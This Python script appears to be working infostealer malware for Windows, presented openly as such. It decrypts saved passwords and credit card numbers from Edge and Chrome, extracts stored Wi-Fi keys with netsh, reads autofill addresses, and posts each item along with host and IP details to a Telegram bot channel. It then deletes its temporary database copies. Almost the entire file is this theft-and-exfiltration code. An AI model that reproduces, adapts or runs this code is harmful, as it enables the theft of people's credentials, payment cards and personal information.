import requests
import subprocess, sys
import os
from os import environ, path
import json
from datetime import datetime, timedelta
import base64
import sqlite3
from Crypto.Cipher import AES
import shutil
from base64 import b64decode
import win32crypt
import win32api
import win32con
import socket
import time
import re
#############
#
#█▀▀▀ █──█ █▀▀█ █▀▀ ▀▀█▀▀ █▀▀ █▀▀▄ █▀▀▀ █▀▀█ █▀▀█ █▀▀▄ 
#█─▀█ █▀▀█ █──█ ▀▀█ ──█── █▀▀ █──█ █─▀█ █▄▄▀ █▄▄█ █▀▀▄ 
#▀▀▀▀ ▀──▀ ▀▀▀▀ ▀▀▀ ──▀── ▀▀▀ ▀▀▀─ ▀▀▀▀ ▀─▀▀ ▀──▀ ▀▀▀─
#
#
##############
URL         = 'https://api.telegram.org/bot%s/sendMessage?chat_id=%s&text=%s&parse_mode=html'
TOKEN       = 'your-id'
CHANNELID   = '@ghostedgroup'
result = '🤪🤪 %s Data 🤪🤪\n' % os.environ['USERNAME']
h_name = socket.gethostname()
IP_addres = socket.gethostbyname(h_name)
public_ip = requests.get("https://api.ipify.org").text
result += 'PubIP: %s\n' % public_ip
result += 'IP: %s\n' % IP_addres
result += 'Hostname: %s\n' % h_name
result += 'AppData: %s\n' % os.environ['LOCALAPPDATA']
requests.get(URL % (TOKEN, CHANNELID, '<pre>%s</pre>' % result))
try:
    def get_encryption_key():
        local_state_path = os.path.join(os.environ["USERPROFILE"],
                                        "AppData", "Local", "Microsoft", "Edge",
                                        "User Data", "Local State")
        with open(local_state_path, "r", encoding="utf-8") as f:
            local_state = f.read()
            local_state = json.loads(local_state)

        key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
        key = key[5:]
        return win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]

    def decrypt_password(password, key):
        try:
            iv = password[3:15]
            password = password[15:]
            cipher = AES.new(key, AES.MODE_GCM, iv)
            return cipher.decrypt(password)[:-16].decode()
        except:
            try:
                return str(win32crypt.CryptUnprotectData(password, None, None, None, 0)[1])
            except:
                return ""

    key = get_encryption_key()
    db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local",
                            "Microsoft", "Edge", "User Data", "default", "Login Data")
    filename = "EdgeData.db"
    shutil.copyfile(db_path, filename)
    db = sqlite3.connect(filename)
    cursor = db.cursor()
    cursor.execute("select origin_url, action_url, username_value, password_value, date_created, date_last_used from logins order by date_created")
   # passwordFile = open("psd.txt", "a")
    for row in cursor.fetchall():
        origin_url = row[0]
        action_url = row[1]
        username = row[2]
        password = decrypt_password(row[3], key)
        row[4]
        row[5]
        if username or password:
            result = (f"\nOrigin URL: {origin_url}\nAction URL: {action_url}\nUsername: {username}\nPassword: {password}")
            requests.get(URL % (TOKEN, CHANNELID, '<pre>%s</pre>' % result))
        else:
            continue
    cb_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local",
                            "Microsoft", "Edge", "User Data", "default", "Web Data")
    filename = "EdgeCata.db"
    shutil.copyfile(cb_path, filename)
    db = sqlite3.connect(filename)
    cursor = db.cursor()
    cursor.execute("select name_on_card, expiration_month, expiration_year, card_number_encrypted from credit_cards")
   # casswordFile = open("cc.txt", "a")
    for row in cursor.fetchall():
        name_on_card = row[0]
        expiration_month = row[1]
        expiration_year = row[2]
        card_number_encrypted = decrypt_password(row[3], key)
        if name_on_card or card_number_encrypted:
            result = (f"Full: {name_on_card}\nEXP: {expiration_month}Year: {expiration_year}\nCard: {card_number_encrypted}")
            requests.get(URL % (TOKEN, CHANNELID, '<pre>%s</pre>' % result))
        else:
            continue
    cursor.close()
    db.close()
    try:
        os.remove(filename)
        os.remove('EdgeData.db')
    except:
        pass
        time.sleep(5)
    #win32api.SetFileAttributes("cc.txt", win32con.FILE_ATTRIBUTE_HIDDEN)
except Exception as e:
    print(e)
time.sleep(4)
class GetWifiPassword:
    def __init__(self):
        self.command = "netsh wlan show profile"
        self.result = ""
        
    def start(self):
        networks = subprocess.check_output(self.command, shell=True, stderr=subprocess.DEVNULL, stdin=subprocess.DEVNULL)
        networks = networks.decode(encoding="utf-8", errors="strict")
        network_names_list = re.findall("(?:Profile\s*:\s)(.*)", networks) 

        for network_name in network_names_list:
            try:
                command = "netsh wlan show profile " + network_name + " key=clear"
                current_result = subprocess.check_output(command, shell=True, stderr=subprocess.DEVNULL, stdin=subprocess.DEVNULL)
                current_result = current_result.decode(encoding="utf-8", errors="strict")        
                
                ssid = re.findall("(?:SSID name\s*:\s)(.*)", str(current_result))
                authentication = re.findall(r"(?:Authentication\s*:\s)(.*)", current_result)
                cipher = re.findall("(?:Cipher\s*:\s)(.*)", current_result)
                security_key = re.findall(r"(?:Security key\s*:\s)(.*)", current_result)
                password = re.findall("(?:Key Content\s*:\s)(.*)", current_result)
                
                self.result += "\n\nSSID           : " + ssid[0] + "\n"
                self.result += "Authentication : " + authentication[0] + "\n"
                self.result += "Cipher         : " + cipher[0] + "\n"
                self.result += "Security Key   : " + security_key[0] + "\n"
                self.result += "Password       : " + password[0] 
            except Exception:
                pass
        
        return self.result
        
if __name__ == '__main__':
    test = GetWifiPassword()
    result = test.start()
    print(result)
#############
result = result
requests.get(URL % (TOKEN, CHANNELID, '<pre>%s</pre>' % result))
time.sleep(2)
try:
    def get_chrome_datetime(chromedate):
        return datetime(1601, 1, 1) + timedelta(microseconds=chromedate)

    def get_encryption_key():
        local_state_path = os.path.join(os.environ["USERPROFILE"],
                                        "AppData", "Local", "Google", "Chrome",
                                        "User Data", "Local State")
        with open(local_state_path, "r", encoding="utf-8") as f:
            local_state = f.read()
            local_state = json.loads(local_state)

        key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
        key = key[5:]
        return win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]

    def decrypt_password(password, key):
        try:
            iv = password[3:15]
            password = password[15:]
            cipher = AES.new(key, AES.MODE_GCM, iv)
            return cipher.decrypt(password)[:-16].decode()
        except:
            try:
                return str(win32crypt.CryptUnprotectData(password, None, None, None, 0)[1])
            except:
                return ""

    key = get_encryption_key()
    db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local",
                            "Google", "Chrome", "User Data", "default", "Login Data")
    filename = "ChromeData.db"
    shutil.copyfile(db_path, filename)
    db = sqlite3.connect(filename)
    cursor = db.cursor()
    cursor.execute("select origin_url, action_url, username_value, password_value, date_created, date_last_used from logins order by date_created")
   # passwordFile = open("psd.txt", "a")
    for row in cursor.fetchall():
        origin_url = row[0]
        action_url = row[1]
        username = row[2]
        password = decrypt_password(row[3], key)
        row[4]
        row[5]
        if username or password:
            result = (f"\nOrigin URL: {origin_url}\nAction URL: {action_url}\nUsername: {username}\nPassword: {password}")
            requests.get(URL % (TOKEN, CHANNELID, '<pre>%s</pre>' % result))
            time.sleep(10)
        else:
            continue
    cb_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local",
                            "Google", "Chrome", "User Data", "default", "Web Data")
    filename = "ChromeCata.db"
    shutil.copyfile(cb_path, filename)
    db = sqlite3.connect(filename)
    cursor = db.cursor()
    cursor.execute("select name_on_card, expiration_month, expiration_year, card_number_encrypted from credit_cards")
   # casswordFile = open("cc.txt", "a")
    for row in cursor.fetchall():
        name_on_card = row[0]
        expiration_month = row[1]
        expiration_year = row[2]
        card_number_encrypted = decrypt_password(row[3], key)
        if name_on_card or card_number_encrypted:
            result = (f"Full: {name_on_card}\nEXP: {expiration_month}\nYear: {expiration_year}\nCard: {card_number_encrypted}")
            requests.get(URL % (TOKEN, CHANNELID, '<pre>%s</pre>' % result))
            time.sleep(10)
        else:
            continue
    xb_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local",
                            "Google", "Chrome", "User Data", "default", "Web Data")
    filename = "Chromexata.db"
    shutil.copyfile(xb_path, filename)
    db = sqlite3.connect(filename)
    cursor = db.cursor()
    cursor.execute("SELECT country_code, street_address, street_name, house_number, city, zip_code FROM autofill_profile_addresses")
    #xasswordFile = open("lg.txt", "a")
    for row in cursor.fetchall():
        country_code = row[0]
        street_address = row[1]
        street_name = row[2]
        house_number = row[3]
        city = row[4]
        zip_code = row[5]
        if country_code or city:
            result = (f"Country: {country_code}\n1add: {street_address}\nStName: {street_name}\nHouse Num: {house_number}\nCity: {city}\nZipCode: {zip_code}")
        else:
            continue
    cursor.close()
    db.close()
    try:
        os.remove(filename)
        os.remove('ChromeData.db')
        os.remove('ChromeCata.db')
    except:
        pass
        time.sleep(10)
    requests.get(URL % (TOKEN, CHANNELID, '<pre>%s</pre>' % result))
    #win32api.SetFileAttributes("cc.txt", win32con.FILE_ATTRIBUTE_HIDDEN)
except Exception as e:
    print(e)

